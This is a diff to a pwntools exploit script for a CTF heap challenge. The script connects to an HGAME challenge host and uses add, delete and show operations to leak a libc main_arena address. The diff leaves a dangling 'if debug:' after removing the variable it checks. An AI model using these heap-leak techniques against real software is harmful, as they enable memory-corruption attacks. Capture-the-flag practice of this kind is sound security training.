@@ -2,24 +2,30 @@ from pwn import *
 import time
 
 context.log_level = 'debug'
+context.terminal = ["/usr/bin/tmux", "sp", "-h"]
 
-debug = True
+f_remote = True if "remote" in sys.argv else False
+f_gdb = True if "gdb" in sys.argv else False
 
-elf = ELF("./vuln")
-libc = ELF("./libc.so.6")
+vuln_path = "./vuln"
+libc_path = "./libc.so.6"
+
+elf, rop = ELF(vuln_path), ROP(vuln_path)
+libc, roplibc = ELF(libc_path), ROP(libc_path)
+
 if debug:
-    io = process("./vuln")
+    io = process([vuln_path])
+    # io = process([vuln_path], env={"LD_PRELOAD": libc_path})
 else:
     io = remote("week-1.hgame.lwsec.cn", 32461)
 
 
-def ddebug():
-    gdb.attach(io)
+def ddebug(b=""):
+    if not f_gdb:
+        return
+
+    gdb.attach(io, gdbscript=b)
     pause()
-
-
-rop = ROP('./vuln')
-roplibc = ROP('./libc.so.6')
 
 
 def add(idx, size, content):
@@ -52,7 +58,7 @@ delete(7)
 add(9, 0x40, "")
 show(9)
 
-ddebug()
+#ddebug()
 libcmain_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
 success("main_arena -> " + hex(libcmain_offset))
 
